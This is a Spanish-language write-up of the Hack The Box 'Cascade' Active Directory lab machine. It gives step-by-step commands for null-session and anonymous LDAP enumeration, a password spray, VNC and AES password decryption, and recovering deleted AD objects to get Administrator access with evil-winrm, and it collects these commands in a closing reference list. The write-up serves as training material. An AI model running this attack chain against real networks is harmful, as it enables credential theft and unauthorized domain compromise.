[🌊 Cascade — HTB [Windows · Medium · AD] 36c15bd2d16c819f9fc5e45e2f029926.md](https://github.com/user-attachments/files/28303091/Cascade.HTB.Windows.Medium.AD.36c15bd2d16c819f9fc5e45e2f029926.md)
# 🌊 Cascade — HTB [Windows · Medium · AD]

| Campo | Detalle |
| --- | --- |
| IP | `10.129.24.158` |
| Dominio | `cascade.local` |
| Vector inicial | LDAP anónimo — atributo `cascadeLegacyPwd` en base64 |
| Usuario inicial | `r.thompson` : `rY4n5eva` |
| Lateral | `s.smith` : `sT333ve2` (VNC registry decrypt) |
| Escalada | `arksvc` : `w3lc0meFr31nd` (reversing CascAudit.exe + AES-CBC) |
| Root | `Administrator` : `baCT3r1aN00dles` (AD Recycle Bin → TempAdmin) |
| Metasploit | ⚠️ Solo irb para decrypt VNC |

---

# 1. Reconocimiento

## Puertos

El primer nmap ya dice bastante — esto es un DC en toda regla. Tenemos Kerberos (88), LDAP (389/636/3268), RPC (135), SMB (139/445) y WinRM (5985). El 5985 abierto ya nos marca el objetivo: si conseguimos credenciales válidas, tenemos shell directa con evil-winrm.

Lo que nos dice cada puerto relevante:

- **53 DNS** — confirma DC. Zone transfer con `dig`, `nslookup`.
- **88 Kerberos** — AS-REP Roasting, Kerberoasting, enum usuarios con kerbrute.
- **135 RPC** — si acepta sesión nula, usuarios y grupos gratis.
- **389/636 LDAP** — si permite bind anónimo, volcamos la estructura del AD.
- **445 SMB** — shares, posibles archivos con credenciales.
- **5985 WinRM** — shell con evil-winrm si tenemos creds válidas.

## RPC — Sesión nula

Lo primero es probar si RPC acepta conexión sin credenciales. En muchos entornos esto está mal configurado y da acceso completo a usuarios y grupos.

```bash
rpcclient -U "" 10.129.24.158 -N
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
```

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image.png)
> 

Funciona. Tenemos: `CascGuest`, `arksvc`, `s.smith`, `r.thompson`, `util`, `j.wakefield`, `s.hickson`, `j.goodhand`, `a.turnbull`, `e.crowe`, `b.hanson`, `d.burman`, `BackupSvc`, `j.allen`, `i.croft`. Todo sin una sola credencial.

---

# 2. Enumeración LDAP

Con LDAP abierto intentamos bind anónimo y volcamos todo. El truco está en filtrar el output — LDAP sin credenciales da muchísimo ruido pero entre ese ruido puede haber cosas muy interesantes.

```bash
ldapsearch -x -H ldap://10.129.24.158 -b "DC=cascade,DC=local" > ldap.txt
cat ldap.txt | grep -iE "password|pwd|desc|info"
```

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%201.png)
> 

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%202.png)
> 

Eso no debería estar ahí. `cascadeLegacyPwd` no es un atributo nativo de AD — alguien lo creó para guardar contraseñas legacy y lo dejó visible sin autenticación.

```bash
echo -n "clk0bjVldmE=" | base64 -d
# → rY4n5eva
```

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%203.png)
> 

## Validación con Kerbrute

Tenemos la password y la lista de usuarios. Password spray para confirmar a quién le pertenece.

```bash
kerbrute passwordspray -d cascade.local --dc 10.129.24.158 users.txt rY4n5eva
```

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%204.png)
> 

Confirmado: `r.thompson:rY4n5eva`.

---

# 3. Enumeración SMB con r.thompson

```bash
smbclient //10.129.24.158/Data -U r.thompson%rY4n5eva
smb: \> cd IT\temp\s.smith
smb: \IT\temp\s.smith\> ls
```

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%205.png)
> 

```bash
smb: \IT\temp\s.smith\> get "VNC Install.reg"
cat "VNC Install.reg"
```

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%206.png)
> 

---

# 4. Movimiento lateral — Decrypt VNC → s.smith

VNC usa DES con una clave fija hardcodeada. Metasploit tiene irb que lo descifra directamente.

```bash
msfconsole
msf > irb
>> key="\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> require 'rex/proto/rfb'
>> Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), key
```

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%207.png)
> 

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%208.png)
> 

Credencial: `s.smith:sT333ve2`.

```bash
evil-winrm -i 10.129.24.158 -u s.smith -p sT333ve2
```

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%209.png)
> 

---

# 5. Enumeración desde s.smith — Audit$

s.smith tiene acceso a un share que r.thompson no tenía: `Audit$`.

```bash
smbclient //10.129.24.158/Audit$ -U s.smith%sT333ve2
smb: \> ls
```

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%2010.png)
> 

Ejecutable con nombre del dominio + DLL personalizada de cifrado. Merece análisis.

---

# 6. Ingeniería inversa — CascAudit.exe

```bash
dotnet tool install -g ilspycmd --version 8.2.0.7535
```

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%2011.png)
> 

```bash
~/.dotnet/tools/ilspycmd ~/CascAudit.exe > codigo_fuente.cs
grep -i "password" codigo_fuente.cs
```

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%2012.png)
> 

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%2013.png)
> 

## Obtener el ciphertext — Audit.db

```bash
smbclient //10.129.24.158/Audit$ -U s.smith%sT333ve2
smb: \> cd DB
smb: \DB\> get Audit.db
sqlite3 Audit.db
sqlite> .tables
sqlite> select * from ldap;
```

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%2014.png)
> 

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%2015.png)
> 

## Parámetros AES por ingeniería inversa

Analizando el ensamblado `AesCrypto` encontramos los parámetros exactos:

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%2016.png)
> 

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%2017.png)
> 

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%2018.png)
> 

Tenemos todo: AES-128-CBC, IV `1tdyjCbY1Ix49842`, clave `c4scadek3y654321`, ciphertext `BQO5l5Kj9MdErXx6Q6AGOw==`.

## Descifrar con Python

```python
from Crypto.Cipher import AES
import base64

key = b"c4scadek3y654321"
iv  = b"1tdyjCbY1Ix49842"
ciphertext = base64.b64decode("BQO5l5Kj9MdErXx6Q6AGOw==")
cipher = AES.new(key, AES.MODE_CBC, iv)
print(cipher.decrypt(ciphertext).decode('utf-8').strip())
```

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%2019.png)
> 

Credencial: `arksvc:w3lc0meFr31nd`.

---

# 7. Escalada — AD Recycle Bin

arksvc pertenece al grupo **AD Recycle Bin**, que puede leer objetos eliminados del AD con todos sus atributos.

Durante la enumeración con r.thompson había más cosas en el share. En `\IT\Email Archives` había un archivo HTML que no miramos entonces.

```bash
smbclient //10.129.24.158/Data -U r.thompson%rY4n5eva
smb: \> cd IT\"Email Archives"
smb: \IT\Email Archives\> get Meeting_Notes_June_2018.html
```

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%2020.png)
> 

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%2021.png)
> 

Si TempAdmin fue eliminado con la Papelera de Reciclaje activa, el objeto sigue accesible con sus atributos.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties *
```

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%2022.png)
> 

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%2023.png)
> 

```bash
echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
# → baCT3r1aN00dles
```

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%2024.png)
> 

```bash
evil-winrm -i 10.129.24.158 -u Administrator -p baCT3r1aN00dles
```

> 
> 
> 
> ![image.png](%F0%9F%8C%8A%20Cascade%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Medium%20%C2%B7%20AD%5D/image%2025.png)
> 

---

# 8. Cadena de ataque

```
RPC sesión nula → lista de usuarios
    ↓
LDAP bind anónimo → cascadeLegacyPwd → r.thompson:rY4n5eva
    ↓
SMB → VNC Install.reg en carpeta de s.smith
    ↓
Decrypt VNC (clave DES fija RealVNC) → s.smith:sT333ve2
    ↓
evil-winrm s.smith → user.txt + acceso a Audit$
    ↓
Reverting CascAudit.exe (ilspycmd) → AES-128-CBC hardcoded → Audit.db
    ↓
Python decrypt → arksvc:w3lc0meFr31nd
    ↓
evil-winrm arksvc → AD Recycle Bin → TempAdmin eliminado → cascadeLegacyPwd
    ↓
baCT3r1aN00dles → Administrator → root.txt
```

---

# 9. Moralejas

## LDAP anónimo + grep es reflejo automático en DCs

El atributo `cascadeLegacyPwd` no es nativo de AD. Alguien lo creó y lo dejó accesible sin autenticación. En un pentest real esto es crítico inmediato. El reflejo debe ser siempre: `ldapsearch` anónimo + `grep -iE "password|pwd|desc|info"`. La mayoría del output es ruido, pero entre ese ruido pueden estar las llaves del castillo.

## VNC en un share = contraseña regalada

El cifrado de VNC lleva roto décadas. La clave DES de RealVNC es pública y Metasploit la tiene integrada. El patrón `"Password"=hex:` en cualquier `.reg` de VNC significa contraseña en 30 segundos.

## Los binarios .NET se descompilan a código legible

ilspycmd convierte cualquier `.exe` de .NET en C# en segundos. Ejecutable con nombre del dominio o de auditoría = 5 minutos de análisis obligatorio. Clave y IV hardcodeados en el código fuente = criptografía débil (CWE-321), crítico en un pentest real.

## AD Recycle Bin preserva atributos de objetos eliminados

Con la Papelera de Reciclaje activa, los objetos eliminados se conservan completos 180 días. TempAdmin fue borrado pero `cascadeLegacyPwd` seguía ahí. Sin leer el email de Meeting Notes no había razón para buscarlo — las pistas narrativas son tan importantes como los hallazgos técnicos.

## El mismo patrón de ataque aparece dos veces

`cascadeLegacyPwd` aparece primero en LDAP con r.thompson y después en el objeto eliminado de TempAdmin. Cuando un patrón funciona, vale la pena buscarlo en todos los sitios posibles.

---

# 10. Comandos clave

```bash
# RPC sesión nula
rpcclient -U "" 10.129.24.158 -N -c "enumdomusers;enumdomgroups"

# LDAP anónimo
ldapsearch -x -H ldap://10.129.24.158 -b "DC=cascade,DC=local" > ldap.txt
cat ldap.txt | grep -iE "password|pwd|desc|info"
echo -n "clk0bjVldmE=" | base64 -d

# Kerbrute spray
kerbrute passwordspray -d cascade.local --dc 10.129.24.158 users.txt rY4n5eva

# SMB
smbclient //10.129.24.158/Data -U r.thompson%rY4n5eva
smbclient //10.129.24.158/Audit$ -U s.smith%sT333ve2

# Decrypt VNC
msf > irb
key="\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), key

# Evil-WinRM
evil-winrm -i 10.129.24.158 -u s.smith -p sT333ve2
evil-winrm -i 10.129.24.158 -u arksvc -p w3lc0meFr31nd

# Reversing .NET
dotnet tool install -g ilspycmd --version 8.2.0.7535
~/.dotnet/tools/ilspycmd CascAudit.exe > codigo_fuente.cs
grep -i "password" codigo_fuente.cs

# SQLite
sqlite3 Audit.db && .tables && select * from ldap;

# Python AES-CBC
from Crypto.Cipher import AES
import base64
key = b"c4scadek3y654321"
iv  = b"1tdyjCbY1Ix49842"
ciphertext = base64.b64decode("BQO5l5Kj9MdErXx6Q6AGOw==")
print(AES.new(key, AES.MODE_CBC, iv).decrypt(ciphertext).decode().strip())

# AD Recycle Bin
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties *
echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d

# Root
evil-winrm -i 10.129.24.158 -u Administrator -p baCT3r1aN00dles
```
